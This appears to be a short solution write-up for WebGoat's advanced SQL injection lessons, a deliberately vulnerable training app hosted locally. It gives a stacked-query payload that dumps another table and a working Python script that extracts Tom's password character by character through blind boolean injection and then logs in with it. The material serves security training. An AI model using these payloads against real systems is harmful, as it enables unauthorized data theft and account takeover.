
## II. Advanced
### More techniques required and blind SQL injection.

3. Pulling data from other tables
```
Name: David';SELECT * FROM user_system_data;--
```

5. Login as Tom
```
import requests
from string import ascii_letters, digits, punctuation

url = "http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge"

headers = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest'
}

#change coookies while having new session.
cookies = {
    'JSESSIONID': 'YourSessionCookie'
}

chars = ascii_letters+digits+punctuation
result = ""
i = 0
out= False
while True:
    i += 1
    for char in chars:
        payload = "username_reg=tom'+and substr(password,{0},1)= '{1}'--+&email_reg=1%40qq.com&password_reg=1&confirm_password_reg=1".format(i, char)
        res = requests.put(url, data=payload, headers=headers, cookies=cookies)
        if 'already exists' in res.text:
            result += char
            print("Password: ",result)
            payload= f'username_login=tom&password_login={result}'
            res= requests.post(url+"_Login",data=payload, cookies=cookies, headers= headers)
            if 'success' in res.text:
                print("Password: ",result,". Log in with this password. ")
                out= True
                break
    if out== True:
        break
```
6. Quiz

Research to finish the quiz.